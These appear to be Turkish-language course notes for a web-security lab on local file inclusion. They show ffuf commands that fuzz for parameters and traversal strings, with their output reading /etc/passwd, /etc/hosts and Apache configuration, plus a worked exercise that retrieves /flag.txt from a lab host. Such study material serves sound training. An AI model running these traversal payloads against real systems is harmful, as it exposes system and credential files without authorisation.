---
glightbox: true
icon: material/help
---

# Automated Scanning

## Fuzzing Parameters

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://SERVER_IP_ADDRESS:PORT/index.php?FUZZ=value' -fs 2287
```

```text title="Output"
...SNIP...

 :: Method           : GET
 :: URL              : http://SERVER_IP_ADDRESS:PORT/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

* [x] `?cat={payload}`
* [x] `?dir={payload}`
* [x] `?action={payload}`
* [x] `?board={payload}`
* [x] `?date={payload}`
* [x] `?detail={payload}`
* [x] `?file={payload}`
* [x] `?download={payload}`
* [x] `?path={payload}`
* [x] `?folder={payload}`
* [x] `?prefix={payload}`
* [x] `?include={payload}`
* [x] `?page={payload}`
* [x] `?inc={payload}`
* [x] `?locate={payload}`
* [x] `?show={payload}`
* [x] `?doc={payload}`
* [x] `?site={payload}`
* [x] `?type={payload}`
* [x] `?view={payload}`
* [x] `?content={payload}`
* [x] `?document={payload}`
* [x] `?layout={payload}`
* [x] `?mod={payload}`
* [x] `?conf={payload}`

## LFI wordlists

```bash
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://SERVER_IP_ADDRESS:PORT/index.php?language=FUZZ' -fs 2287
```

```text title="Output"
...SNIP...

 :: Method           : GET
 :: URL              : http://SERVER_IP_ADDRESS:PORT/index.php?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]

...SNIP...

../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

## Fuzzing Server Files

### Server Webroot

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://SERVER_IP_ADDRESS:PORT/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

```text title="Output"
...SNIP...

: Method           : GET
 :: URL              : http://SERVER_IP_ADDRESS:PORT/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```

### Server Logs/Configurations

SecLists reposunda bulunmayan [LFI-WordList-Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) ve [LFI-WordList-Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) listeleri de kullanışlı listelerdir.

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://SERVER_IP_ADDRESS:PORT/index.php?language=../../../../FUZZ' -fs 2287
```

```text title="Output" hl_lines="25"
...SNIP...

 :: Method           : GET
 :: URL              : http://SERVER_IP_ADDRESS:PORT/index.php?language=../../../../FUZZ
 :: Wordlist         : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]

...SNIP...

/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```

Apache değişkenlerinin (örneğin `APACHE_LOG_DIR`) tutulduğu dosyanın içeriğini okumak için aşağıdaki komutu kullanabiliriz:

```bash
curl http://SERVER_IP_ADDRESS:PORT/index.php?language=../../../../etc/apache2/envvars
```

```text title="Output" hl_lines="10"
...SNIP...

export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX

...SNIP...
```

## Questions

```text
Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt
```

??? tip "Steps"

    FFuF kullanarak geçerli bir parametre bul:

    ```bash
    ffuf -ic -fs 2309 -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.255.150:57245/index.php?FUZZ=value'
    ```

    ```text title="Output" hl_lines="22"
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
          \ \_\   \ \_\  \ \____/  \ \_\
           \/_/    \/_/   \/___/    \/_/

        v2.1.0-dev
    ________________________________________________

    :: Method           : GET
    :: URL              : http://83.136.255.150:57245/index.php?FUZZ=value
    :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
    :: Follow redirects : false
    :: Calibration      : false
    :: Timeout          : 10
    :: Threads          : 40
    :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
    :: Filter           : Response size: 2309
    ________________________________________________

    view                    [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 78ms]
    :: Progress: [6453/6453] :: Job [1/1] :: 94 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
    ```

    Bulunan parametreyi (`view`) kullanarak uygun bir LFI dizesi bul:

    ```bash
    ffuf -ic -fs 1935 -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://83.136.255.150:57245/index.php?view=FUZZ'
    ```

    ```text title="Output" hl_lines="26"
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
          \ \_\   \ \_\  \ \____/  \ \_\
           \/_/    \/_/   \/___/    \/_/

        v2.1.0-dev
    ________________________________________________

    :: Method           : GET
    :: URL              : http://83.136.255.150:57245/index.php?view=FUZZ
    :: Wordlist         : FUZZ: /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
    :: Follow redirects : false
    :: Calibration      : false
    :: Timeout          : 10
    :: Threads          : 40
    :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
    :: Filter           : Response size: 1935
    ________________________________________________

    ../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 69ms]
    ../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 73ms]
    ../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 77ms]
    ../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 133ms]
    ../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 150ms]
    ../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 151ms]
    :: Progress: [922/922] :: Job [1/1] :: 284 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
    ```

    Aşağıdaki komut ile flag bilgisini öğren:

    ```bash
    curl 'http://83.136.255.150:57245/index.php?view=../../../../../../../../../../../../../../../../../flag.txt'
    ```
